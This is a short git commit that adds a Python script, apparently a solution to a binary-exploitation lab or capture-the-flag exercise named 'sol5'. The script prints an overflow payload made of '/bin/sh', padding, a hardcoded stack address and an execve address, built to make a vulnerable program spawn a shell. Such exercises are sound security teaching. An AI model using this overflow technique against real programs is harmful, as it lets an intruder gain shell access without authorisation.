63836137d673de98c418470d6aaeb4c0203f6dd3
Angela Matta <tieflingcoderfreelance@gmail.com>
2024-11-14 00:08:55 -0500

    Update sol5.py

--- sol5.py
+++ sol5.py
@@ -1,3 +1,6 @@
 #!/usr/bin/env python3
-
 import sys
+input1 = '/bin/sh'
+bufaddress = 0x7ffffff6b0ae
+exevcaddress = 0x0000000000455050
+sys.stdout.buffer.write(input1.encode() + b'\x00'*19  + bufaddress.to_bytes(8,'little') + b'\x00' * 8  + exevcaddress.to_bytes(8,'little'))
